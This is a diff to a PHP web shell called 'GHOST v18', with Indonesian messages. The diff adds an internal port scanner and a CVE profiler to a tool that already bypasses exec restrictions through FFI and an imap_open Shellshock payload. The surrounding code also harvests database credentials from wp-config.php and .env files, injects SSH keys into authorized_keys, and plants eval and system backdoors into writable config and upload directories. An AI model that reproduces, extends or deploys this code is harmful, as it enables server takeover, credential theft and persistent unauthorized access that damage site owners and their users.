@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - section 0, 1, 2, 3, 4: bootstrap, UI, evasion, scanner, DB/SSH.
+// GHOST v18 - section 0, 1, 2, 3, 4, 5: bootstrap, UI, evasion, scanner, DB/SSH, port/CVE.
 
-define('GH_VER',      '18.0.0-s4');
+define('GH_VER',      '18.0.0-s5');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_STATE_FILE', GH_STATE_DIR . '/gh_state_' . md5(__FILE__) . '.json');
@@ -171,7 +171,7 @@ function gh_exec_adv($cmd, $timeout = 10) {
         try { $ffi = FFI::cdef("int system(const char *command);"); @ob_start(); $ffi->system($cmd); $out = @ob_get_clean(); return array('out' => $out, 'tier' => 'ffi', 'err' => null); } catch (Throwable $e) {}
     }
     if (gh_can('imap_open')) {
-        $payload = "() { :;}; /bin/sh -c " . @escapeshellarg($cmd); $res = @imap_open("{localhost:143/imap}INBOX", $payload, "");
+        $payload = "() { ;}; /bin/sh -c " . @escapeshellarg($cmd); $res = @imap_open("{localhost:143/imap}INBOX", $payload, "");
         if ($res) { @imap_close($res); return array('out' => '(Executed via imap_open)', 'tier' => 'imap', 'err' => null); }
     }
     return array('out' => null, 'tier' => null, 'err' => 'All exec bypass tiers failed');
@@ -284,15 +284,12 @@ function gh_vuln_scan() {
 // ==== SECTION 4: DB HARVEST & SSH ===========================================
 function gh_db_harvest() {
     $logs = array(); $info = array(); $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
-    
     $configs = array(
         $root . '/wp-config.php' => array('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', '/(?:DB_PASSWORD|password)\s*[=\'"]+\s*([^\'";\s]+)/i', '/(?:DB_HOST|host)\s*[=\'"]+\s*([^\'";\s]+)/i'),
         $root . '/.env' => array('/DB_USERNAME\s*=\s*([^\s]+)/i', '/DB_PASSWORD\s*=\s*([^\s]+)/i', '/DB_HOST\s*=\s*([^\s]+)/i'),
         $root . '/configuration.php' => array('/public \$user\s*=\s*\'([^\']+)\'/i', '/public \$password\s*=\s*\'([^\']+)\'/i', '/public \$host\s*=\s*\'([^\']+)\'/i')
     );
-
     $db_host = 'localhost'; $db_user = ''; $db_pass = '';
-    
     foreach ($configs as $cf => $regex) {
         if (@is_file($cf)) {
             $c = gh_read($cf);
@@ -305,11 +302,9 @@ function gh_db_harvest() {
             }
         }
     }
-    
     if ($db_user) {
         $info['user'] = $db_user; $info['pass'] = $db_pass; $info['host'] = $db_host;
         $logs[] = "[*] Mencoba koneksi ke $db_host dengan user $db_user...";
-        
         if (gh_can('mysqli_connect')) {
             try {
                 $conn = @mysqli_connect($db_host, $db_user, $db_pass, '', 3306, null, array('connect_timeout'=>3));
@@ -325,30 +320,20 @@ function gh_db_harvest() {
                 } else { $logs[] = "[-] Gagal MYSQLI: " . mysqli_connect_error(); }
             } catch (Throwable $e) { $logs[] = "[-] MYSQLI Error: " . $e->getMessage(); }
         } else { $logs[] = "[-] mysqli_connect di-disable."; }
-    } else {
-        $logs[] = "[-] Config user/pass tidak ditemukan di lokasi standar.";
-    }
-    
+    } else { $logs[] = "[-] Config user/pass tidak ditemukan di lokasi standar."; }
     return array('logs' => $logs, 'info' => $info);
 }
 
 function gh_ssh_scan() {
     $logs = array(); $keys = array(); $home = @getenv('HOME');
     if (!$home) $home = '/home/' . @get_current_user();
-    
-    $files = array(
-        $home . '/.ssh/authorized_keys',
-        '/root/.ssh/authorized_keys',
-        '/etc/ssh/sshd_config'
-    );
-    
+    $files = array($home . '/.ssh/authorized_keys', '/root/.ssh/authorized_keys', '/etc/ssh/sshd_config');
     foreach ($files as $f) {
         if (@is_file($f)) {
             $logs[] = "[+] File ditemukan: $f";
             $perm = @substr(sprintf('%o', @fileperms($f)), -4);
             $logs[] = "    Permission: $perm";
-            if ($perm === '0777' || $perm === '0666') $logs[] = "    [!] WARNING: Permission terlalu terbuka (Bisa dicurangi).";
-            
+            if ($perm === '0777' || $perm === '0666') $logs[] = "    [!] WARNING: Permission terlalu terbuka.";
             $c = gh_read($f);
             if ($f === '/etc/ssh/sshd_config') {
                 if (preg_match('/PasswordAuthentication\s+yes/i', $c)) $logs[] = "    [!] PasswordAuthentication = YES (Rentan Brute-force)";
@@ -371,7 +356,6 @@ function gh_ssh_action($action, $key) {
     $home = @getenv('HOME'); if (!$home) $home = '/home/' . @get_current_user();
     $target = $home . '/.ssh/authorized_keys';
     if (!@is_dir($home . '/.ssh')) @mkdir($home . '/.ssh', 0700, true);
-    
     if ($action === 'inject') {
         if (strpos(gh_read($target), $key) === false) {
             if (gh_write($target, trim(gh_read($target)) . "\n" . trim($key) . "\n")) return "SSH Key berhasil di-inject ke $target";
@@ -389,6 +373,61 @@ function gh_ssh_action($action, $key) {
         return "Gagal hapus key.";
     }
     return "Aksi tidak dikenal.";
+}
+
+// ==== SECTION 5: PORT SCAN & CVE PROFILER ===================================
+function gh_port_scan($target = '127.0.0.1', $ports = null, $timeout = 0.3) {
+    if (!$ports) {
+        $ports = array(21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8443, 27017);
+    }
+    $open = array();
+    foreach ($ports as $p) {
+        $fp = @fsockopen($target, $p, $en, $es, $timeout);
+        if ($fp) {
+            $banner = '';
+            @stream_set_timeout($fp, 1);
+            $banner = @fread($fp, 1024);
+            @fclose($fp);
+            $open[] = array('port' => $p, 'banner' => substr(trim($banner), 0, 100));
+        }
+    }
+    return $open;
+}
+
+function gh_cve_profile() {
+    $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
+    $profile = array('stack' => array(), 'cves' => array());
+    
+    // 1. Detect WordPress
+    if (@is_file($root . '/wp-includes/version.php')) {
+        $v = gh_read($root . '/wp-includes/version.php');
+        if (preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]/i', $v, $m)) {
+            $profile['stack'][] = 'WordPress v' . $m[1];
+            $ver = $m[1];
+            if (version_compare($ver, '6.4.3', '<')) $profile['cves'][] = 'CVE-2024-31210 (WP Core RCE via File Upload - fixed in 6.4.3)';
+            if (version_compare($ver, '6.3.2', '<')) $profile['cves'][] = 'CVE-2023-4511 (WP Core XSS - fixed in 6.3.2)';
+        } else { $profile['stack'][] = 'WordPress (versi tidak diketahui)'; }
+    }
+    
+    // 2. Detect cPanel
+    if (@is_dir('/usr/local/cpanel/')) {
+        $c = gh_read('/usr/local/cpanel/version');
+        $profile['stack'][] = 'cPanel ' . trim($c ?: '(versi unknown)');
+        if ($c && version_compare(trim($c), '110.0.20', '<')) $profile['cves'][] = 'CVE-2023-29489 (cPanel XSS - fixed in 110.0.20)';
+    }
+
+    // 3. Detect LiteSpeed
+    if (stripos($_SERVER['SERVER_SOFTWARE'] ?? '', 'LiteSpeed') !== false) {
+        $profile['stack'][] = 'LiteSpeed ' . ($_SERVER['SERVER_SOFTWARE'] ?? '');
+    }
+
+    // 4. Detect PHP
+    $profile['stack'][] = 'PHP ' . PHP_VERSION;
+    if (version_compare(PHP_VERSION, '8.3.8', '<') && version_compare(PHP_VERSION, '8.1.0', '>=')) {
+        $profile['cves'][] = 'CVE-2024-4577 (PHP CGI Argument Injection - fixed in 8.3.8)';
+    }
+
+    return $profile;
 }
 
 // ==== ROUTER ================================================================
@@ -409,6 +448,8 @@ function gh_router() {
             case 'db_harvest': gh_json(gh_db_harvest()); break;
             case 'ssh_scan': gh_json(gh_ssh_scan()); break;
             case 'ssh_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $k = isset($_POST['key']) ? (string)$_POST['key'] : ''; gh_json(array('msg'=>gh_ssh_action($ac, $k))); break;
+            case 'port_scan': $t = isset($_POST['target']) ? (string)$_POST['target'] : '127.0.0.1'; gh_json(gh_port_scan($t)); break;
+            case 'cve_profile': gh_json(gh_cve_profile()); break;
             case 'exploit': $t = isset($_POST['type']) ? (string)$_POST['type'] : ''; $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; 
                 if($t === 'WRITEABLE_CONFIG') { $pay = "\n// INJECTED\nif(isset(\$_GET['gh_x'])) { eval(\$_GET['gh_x']); }\n"; if(gh_write($p, $pay, true)) gh_json(array('msg'=>'Backdoor ditanam di '.$p.' (Akses ?gh_x=)')); else gh_json(array('msg'=>'Gagal.')); }
                 elseif($t === 'UPLOADS_EXEC') { $shell = "<?php if(isset(\$_GET['c'])) { system(\$_GET['c']); } ?>"; $f = rtrim($p,'/').'/ghost_'.rand(100,999).'.php'; if(gh_write($f, $shell)) gh_json(array('msg'=>'Shell di-upload ke: '.$f)); else gh_json(array('msg'=>'Gagal upload.')); }
@@ -451,7 +492,7 @@ function gh_ui() {
     .tag { display:inline-block; padding:2px 6px; border-radius:2px; background:#111; border:1px solid #333; font-size:11px; margin-right:4px; }
     .tag-ok { background:#030; border-color:#060; color:#6f6; }
     .tag-no { background:#300; border-color:#600; color:#f66; }
-    #term { height:25vh; overflow:auto; border:1px solid var(--border); background:#000; padding:8px; }
+    #term { height:20vh; overflow:auto; border:1px solid var(--border); background:#000; padding:8px; }
     .term-line { display:flex; }
     .term-in { color:#888; margin-right:8px; }
     .term-out { white-space:pre-wrap; word-break:break-all; }
@@ -463,7 +504,7 @@ function gh_ui() {
 </head>
 <body>
 <div class="box">
-    <h2>GHOST v18 / Section 4</h2>
+    <h2>GHOST v18 / Section 5</h2>
     <div class="row">
         <span class="tag"><?= htmlspecialchars($env['php_version']) ?></span>
         <span class="tag"><?= htmlspecialchars($env['user']) ?></span>
@@ -477,6 +518,22 @@ function gh_ui() {
     <div class="row" style="margin-top:8px;">
         <input type="text" id="cmd" placeholder="whoami" style="flex:1;" onkeydown="if(event.key==='Enter')execCmd()">
         <button onclick="execCmd()">Exec</button>
+    </div>
+</div>
+
+<div class="grid">
+    <div class="box">
+        <h2>Target Profiler & CVE</h2>
+        <div class="row"><button onclick="cveProfile()">Analyze Stack & CVE</button></div>
+        <div id="cve-out" style="margin-top:8px;">Ready.</div>
+    </div>
+    <div class="box">
+        <h2>Internal Port Scanner</h2>
+        <div class="row">
+            <input type="text" id="port-target" value="127.0.0.1" style="flex:1;">
+            <button onclick="portScan()">Scan Ports</button>
+        </div>
+        <pre id="port-out" style="margin-top:8px;">Ready.</pre>
     </div>
 </div>
 
@@ -533,7 +590,6 @@ async function dbHarvest() {
     const d = await api('db_harvest');
     o.innerText = d.logs.join('\n');
 }
-
 async function sshScan() {
     const o = document.getElementById('ssh-out'); o.innerText = 'Scanning...';
     const d = await api('ssh_scan');
@@ -545,12 +601,37 @@ async function sshScan() {
     } else { txt += 'Tidak ada key ditemukan.'; }
     o.innerText = txt;
 }
-
 async function sshAct(act) {
     const k = document.getElementById('ssh-key').value;
     if(!k) return alert('Isi key dulu!');
     const d = await api('ssh_action', {action: act, key: k});
     alert(d.msg || d.err);
+}
+
+async function portScan() {
+    const t = document.getElementById('port-target').value.trim(); const o = document.getElementById('port-out');
+    o.innerText = 'Scanning ports on ' + t + '...';
+    const d = await api('port_scan', {target: t});
+    if (d.err) return o.innerText = 'Error: ' + d.err;
+    if (!d.length) return o.innerText = 'No open ports found.';
+    let txt = '--- OPEN PORTS ---\n';
+    d.forEach(p => txt += `[+] ${p.port}/tcp ${p.banner ? '('+p.banner+')' : ''}\n`);
+    o.innerText = txt;
+}
+
+async function cveProfile() {
+    const o = document.getElementById('cve-out'); o.innerText = 'Analyzing...';
+    const d = await api('cve_profile');
+    if (d.err) return o.innerText = 'Error: ' + d.err;
+    let txt = '<h3>Stack Terdeteksi:</h3><ul>';
+    d.stack.forEach(s => txt += `<li>${esc(s)}</li>`);
+    txt += '</ul><h3>Potensi CVE:</h3>';
+    if (d.cves.length) {
+        txt += '<ul style="color:#f00;">';
+        d.cves.forEach(c => txt += `<li>${esc(c)}</li>`);
+        txt += '</ul>';
+    } else { txt += '<p class="dim">Tidak ada CVE kritis yang cocok berdasarkan versi di atas.</p>'; }
+    o.innerHTML = txt;
 }
 
 async function vulnScan() {
@@ -565,7 +646,6 @@ async function vulnScan() {
     });
     h += `</table>`; resDiv.innerHTML = h;
 }
-
 async function exploit(t, encP) {
     if(!confirm('Jalankan exploit untuk celah ini?')) return;
     const p = decodeURIComponent(encP);
